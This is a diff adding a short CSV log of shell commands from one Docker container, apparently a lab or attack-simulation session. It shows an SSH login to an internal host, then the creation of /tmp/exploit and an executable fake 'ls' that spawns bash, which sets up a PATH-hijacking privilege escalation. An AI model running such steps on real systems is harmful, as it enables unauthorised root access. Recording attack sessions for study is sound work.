@@ -1,0 +1,8 @@
+docker_id;generation;full_time;service;command
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:31:01;-1;ssh ot-user@10.0.0.11 -p 2222
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:43:37;-1;ccc
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:43:41;-1;mkdir /tmp/exploit
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:43:42;-1;cd /tmp/exploit
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:43:42;-1;echo '#!/bin/bash' > ls
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:43:42;-1;echo '/bin/bash' >> ls
+dd38607a-9d00-41ba-b359-6f0784ab8e2f;9;2025-10-17 11:43:42;-1;chmod +x ls
